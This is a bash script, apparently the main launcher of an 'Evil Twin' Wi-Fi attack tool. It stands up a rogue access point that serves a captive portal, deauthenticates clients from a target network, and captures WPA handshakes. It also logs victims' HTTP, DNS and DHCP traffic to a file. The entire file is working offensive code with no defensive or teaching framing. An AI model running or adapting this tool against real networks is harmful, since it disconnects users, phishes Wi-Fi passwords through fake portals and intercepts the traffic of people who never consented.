#!/usr/bin/env bash
set -euo pipefail

# Load configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/config.sh"
source "$SCRIPT_DIR/lib/core.sh"
source "$SCRIPT_DIR/attacks/ap.sh"
source "$SCRIPT_DIR/attacks/handshake.sh"

# Override defaults with CLI arguments
SSID="$DEFAULT_SSID"
CHANNEL="$DEFAULT_CHANNEL"
AP_IFACE="wlan0"              # Using wlan0 for AP creation
DEAUTH_IFACE="wlan1"          # Using wlan1 for deauth
PORTAL_DIR="$DEFAULT_PORTAL_DIR"
TARGET_BSSID="$DEFAULT_TARGET_BSSID"
TARGET_CHANNEL="$DEFAULT_TARGET_CHANNEL"
SKIP_INTERFACE_SETUP="false"
LOG_FILE="/tmp/evil_twin_info.log"  # Log file for all captured info

# Parse command line arguments
usage() {
    cat <<EOF
Usage: sudo $0 [OPTIONS]

Options:
    --ssid <name>              SSID for the fake AP (default: $DEFAULT_SSID)
    --channel <1-13>           Channel for the fake AP (default: $DEFAULT_CHANNEL)
    --ap-iface <iface>         Interface for AP (managed mode, default: wlan0)
    --deauth-iface <iface>     Interface for deauth attacks (monitor mode, default: wlan1)
    --portal-dir <folder>      Directory containing the captive portal (default: $DEFAULT_PORTAL_DIR)
    --target-bssid <mac>       Target AP BSSID for handshake capture
    --target-channel <1-14>    Target AP channel for handshake capture
    --skip-interface-setup     Skip interface setup (for pre-configured monitor interfaces)
    -h, --help                 Show this help message

Example:
    sudo $0 --ssid "Test Network" --channel 6 --portal-dir ./sites/Example.portal

EOF
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --ssid)                 SSID="$2"; shift 2 ;;
        --channel)              CHANNEL="$2"; shift 2 ;;
        --ap-iface)             AP_IFACE="$2"; shift 2 ;;
        --deauth-iface)         DEAUTH_IFACE="$2"; shift 2 ;;
        --portal-dir)           PORTAL_DIR="$2"; shift 2 ;;
        --target-bssid)         TARGET_BSSID="$2"; shift 2 ;;
        --target-channel)       TARGET_CHANNEL="$2"; shift 2 ;;
        --skip-interface-setup) SKIP_INTERFACE_SETUP="true"; shift ;;
        -h|--help)              usage; exit 0 ;;
        *) echo "Unknown argument: $1"; usage; exit 1 ;;
    esac
done

# Export the skip interface setup flag so it's available to functions
export SKIP_INTERFACE_SETUP

# Expand tilde in portal directory path
PORTAL_DIR="${PORTAL_DIR/#\~/$HOME}"

# Check prerequisites
check_root
check_dependencies

# Validate portal directory if specified
if [[ -n "$PORTAL_DIR" ]]; then
    validate_directory "$PORTAL_DIR"
fi

# Validate interfaces
validate_interface "$AP_IFACE"
validate_interface "$DEAUTH_IFACE"

# Make sure the two interfaces are different
if [[ "$AP_IFACE" == "$DEAUTH_IFACE" ]]; then
    error_exit "AP interface and deauth interface must be different"
fi

# If target BSSID is provided, target channel is required
if [[ -n "$TARGET_BSSID" && -z "$TARGET_CHANNEL" ]]; then
    error_exit "Target channel is required when target BSSID is specified"
fi

# If target channel is provided, target BSSID is required
if [[ -n "$TARGET_CHANNEL" && -z "$TARGET_BSSID" ]]; then
    error_exit "Target BSSID is required when target channel is specified"
fi

# Set up working directory
WORKDIR="$(mktemp -d /tmp/evil_twin.XXXXXX)"
log "Working directory: $WORKDIR"

# Export WORKDIR so it's available to functions
export WORKDIR

# Set up trap for cleanup
setup_trap

# Create log file
touch "$LOG_FILE"
log "Logging information to: $LOG_FILE"

# Create configuration files
HOSTAPD_CONF="$WORKDIR/hostapd.conf"
DNSMASQ_CONF="$WORKDIR/dnsmasq.conf"
HTTP_LOG="$WORKDIR/http.log"
HANDSHAKE_FILE="$WORKDIR/handshake"

# Create monitor mode interface for deauth if needed
if [[ "$SKIP_INTERFACE_SETUP" != "true" ]]; then
    log "Creating monitor mode interface for deauth: $DEAUTH_IFACE"
    
    # Check if interface is already in monitor mode
    if iw dev "$DEAUTH_IFACE" info 2>&1 | grep -q "type monitor"; then
        log "$DEAUTH_IFACE is already in monitor mode"
    else
        log "Setting $DEAUTH_IFACE to monitor mode"
        ip link set "$DEAUTH_IFACE" down
        iw dev "$DEAUTH_IFACE" set type monitor
        ip link set "$DEAUTH_IFACE" up
    fi
fi

# Set up AP interface (managed mode)
if [[ "$SKIP_INTERFACE_SETUP" == "true" ]]; then
    log "Skipping interface setup (using pre-configured interfaces)"
else
    log "Setting up AP interface: $AP_IFACE in managed mode"
    # Ensure AP interface is in managed mode
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type managed 2>/dev/null || true
    setup_interface "$AP_IFACE" "$AP_IP/24"
fi

# Create hostapd configuration
create_hostapd_conf "$HOSTAPD_CONF" "$AP_IFACE" "$SSID" "$CHANNEL"

# Create dnsmasq configuration
create_dnsmasq_conf "$DNSMASQ_CONF" "$AP_IP" "$AP_DHCP_START" "$AP_DHCP_END" "$AP_DHCP_LEASE"

# Start services
log "Starting AP services..."
start_hostapd "$HOSTAPD_CONF" "$WORKDIR/hostapd.pid"
start_dnsmasq "$DNSMASQ_CONF" "$AP_IFACE" "$WORKDIR/dnsmasq.pid"

# Start HTTP server only if portal directory is specified
if [[ -n "$PORTAL_DIR" ]]; then
    start_http_server "$PORTAL_DIR" "$AP_IP" "$HTTP_LOG" "$WORKDIR/http.pid"
fi

# Start handshake capture if target is specified
if [[ -n "$TARGET_BSSID" && -n "$TARGET_CHANNEL" ]]; then
    log "Starting handshake capture and deauth attacks..."
    start_handshake_capture "$DEAUTH_IFACE" "$TARGET_BSSID" "$TARGET_CHANNEL" "$HANDSHAKE_FILE" "$WORKDIR/airodump.pid"
    start_deauth "$DEAUTH_IFACE" "$TARGET_BSSID" "$TARGET_CHANNEL"
fi

# Start monitoring processes in separate windows
log "Starting monitoring processes..."

# Function to monitor HTTP requests and log them
monitor_http() {
    log "Monitoring HTTP requests..."
    while true; do
        if [[ -f "$HTTP_LOG" ]]; then
            tail -n 0 -f "$HTTP_LOG" | while read line; do
                echo "[$(date +'%Y-%m-%d %H:%M:%S')] HTTP: $line" >> "$LOG_FILE"
                echo "HTTP: $line"
            done
        fi
        sleep 1
    done
}

# Function to monitor DNS requests and log them
monitor_dns() {
    log "Monitoring DNS requests..."
    while true; do
        if [[ -f "$WORKDIR/dnsmasq.log" ]]; then
            tail -n 0 -f "$WORKDIR/dnsmasq.log" | grep --line-buffered "query\|cached\|reply" | while read line; do
                echo "[$(date +'%Y-%m-%d %H:%M:%S')] DNS: $line" >> "$LOG_FILE"
                echo "DNS: $line"
            done
        fi
        sleep 1
    done
}

# Function to monitor DHCP requests and log them
monitor_dhcp() {
    log "Monitoring DHCP requests..."
    while true; do
        if [[ -f "$WORKDIR/dnsmasq.log" ]]; then
            tail -n 0 -f "$WORKDIR/dnsmasq.log" | grep --line-buffered "DHCP\|dhcp" | while read line; do
                echo "[$(date +'%Y-%m-%d %H:%M:%S')] DHCP: $line" >> "$LOG_FILE"
                echo "DHCP: $line"
            done
        fi
        sleep 1
    done
}

# Function to monitor deauth attacks
monitor_deauth() {
    log "Monitoring deauth attacks..."
    while true; do
        if [[ -f "$WORKDIR/deauth.pid" ]]; then
            local pid=$(cat "$WORKDIR/deauth.pid")
            if kill -0 "$pid" 2>/dev/null; then
                echo "[$(date +'%Y-%m-%d %H:%M:%S')] DEAUTH: Deauth process running (PID: $pid)" >> "$LOG_FILE"
                echo "DEAUTH: Deauth process running (PID: $pid)"
            else
                echo "[$(date +'%Y-%m-%d %H:%M:%S')] DEAUTH: Deauth process not running" >> "$LOG_FILE"
                echo "DEAUTH: Deauth process not running"
            fi
        fi
        sleep 10
    done
}

# Start monitoring in background
monitor_http &
echo $! > "$WORKDIR/monitor_http.pid"

monitor_dns &
echo $! > "$WORKDIR/monitor_dns.pid"

monitor_dhcp &
echo $! > "$WORKDIR/monitor_dhcp.pid"

monitor_deauth &
echo $! > "$WORKDIR/monitor_deauth.pid"

# Display information
log "=========================================="
log "Evil Twin attack is running"
log "SSID: $SSID"
log "Channel: $CHANNEL"
log "AP Interface: $AP_IFACE (managed mode)"
log "Deauth Interface: $DEAUTH_IFACE (monitor mode)"
log "AP IP: $AP_IP"
log "Log File: $LOG_FILE"
log "Skip Interface Setup: $SKIP_INTERFACE_SETUP"

if [[ -n "$PORTAL_DIR" ]]; then
    log "Portal Directory: $PORTAL_DIR"
fi

if [[ -n "$TARGET_BSSID" ]]; then
    log "Target BSSID: $TARGET_BSSID"
    log "Target Channel: $TARGET_CHANNEL"
    log "Handshake file: $HANDSHAKE_FILE-01.cap"
fi

log "=========================================="
log "Press Ctrl+C to stop and clean up"

# Wait indefinitely
while true; do
    # Check if critical processes are still running
    if [[ -f "$WORKDIR/hostapd.pid" ]] && ! kill -0 "$(cat "$WORKDIR/hostapd.pid")" 2>/dev/null; then
        error_exit "hostapd process has died"
    fi
    if [[ -f "$WORKDIR/dnsmasq.pid" ]] && ! kill -0 "$(cat "$WORKDIR/dnsmasq.pid")" 2>/dev/null; then
        error_exit "dnsmasq process has died"
    fi
    sleep 10
done
